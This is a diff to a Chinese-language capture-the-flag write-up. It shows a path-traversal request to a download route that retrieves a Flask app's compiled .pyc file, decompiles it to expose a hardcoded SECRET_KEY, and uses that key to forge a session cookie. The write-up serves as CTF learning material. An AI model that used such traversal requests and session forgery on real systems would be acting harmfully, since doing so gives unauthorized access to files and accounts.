@@ -14,3 +14,31 @@ download路由下载载源码被过滤了
 
 ![](attachments/Pasted%20image%2020230610115418.png)
 
+download ban了py文件 通过eval路由读取到了pyc文件路径
+
+/download?file=../../../../../app/__pycache__/part.cpython-311.pyc
+
+![](attachments/Pasted%20image%2020230610145542.png)
+
+在线反编译
+
+```python
+#!/usr/bin/env python
+# visit https://tool.lu/pyc/ for more information
+# Version: Python 3.11
+
+import os
+import random
+import hashlib
+from flask import *
+from lxml import etree
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'o2takuXX_donot_like_ntr'
+
+```
+
+伪造session 
+![](attachments/Pasted%20image%2020230610145827.png)
+
+
+![](attachments/Pasted%20image%2020230610145817.png)
